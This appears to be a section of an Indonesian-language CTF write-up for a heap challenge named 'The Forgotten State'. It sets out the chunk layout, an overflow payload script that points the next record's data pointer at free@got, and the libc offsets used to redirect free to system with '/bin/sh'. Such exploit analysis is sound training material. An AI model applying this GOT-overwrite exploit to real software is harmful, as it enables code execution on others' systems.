# THE FORGOTTEN STATE — Analisis

[← Overview](42-the-forgotten-state.md) · [Index](index.md)

## 2.6 Aritmetika overflow

Urutan `create`:

```text
rec0: record A0 (chunk 0x30), data B0 (chunk 0x30)
rec1: record A1 (chunk 0x30), data B1 (chunk 0x30)
rec2: record A2, data B2 = "/bin/sh"
rec3: record A3, data B3
```

`edit(rec0, 0x50)` menulis dari user data `B0`:

```text
B0+0x00 .. B0+0x1f   data rec0 (32 byte)
B0+0x20 .. B0+0x27   A1->prev_size
B0+0x28 .. B0+0x2f   A1->size       -> 0x31
B0+0x30 .. B0+0x3f   A1->name[16]
B0+0x40 .. B0+0x43   A1->len        -> 8
B0+0x44 .. B0+0x47   A1->flags      -> 1
B0+0x48 .. B0+0x4f   A1->data       -> free@got
```

Payload 0x50 byte di script:

```python
ov  = b'A' * 0x28
ov += p64(0x31)          # rec1 chunk size
ov += b'X' * 0x10        # rec1 name
ov += p32(8) + p32(1)   # rec1 len, flags
ov += p64(FREE_GOT)      # rec1->data
assert len(ov) == 0x50
```

## 2.7 Alamat dan offset

| Item | Nilai |
|---|---|
| `free@got` | `0x404000` |
| `free` offset | `0xb5360` |
| `system` offset | `0x5c2e0` |

`release(rec3)` dipanggil lebih dulu untuk memastikan `free@got` sudah terselesaikan (tidak lagi menunjuk PLT stub) sebelum leak.
